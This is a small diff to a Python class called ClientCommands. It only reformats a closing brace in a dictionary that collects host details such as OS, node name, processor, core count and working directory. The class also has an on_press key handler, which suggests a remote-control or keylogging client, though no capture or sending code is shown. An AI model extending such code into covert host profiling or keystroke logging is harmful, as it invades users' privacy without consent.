@@ -27,7 +27,8 @@ class ClientCommands:
                 "SYSTEM":{"OS":platform.platform(),"Node":platform.node(),
                           "Machine-Type":platform.machine(),"Processor":platform.processor(),
                           "Core": os.cpu_count(),
-                          "Altair-in-here":os.getcwd()}}
+                          "Altair-in-here":os.getcwd()}
+               }
         return data
         
     def on_press(self,key):
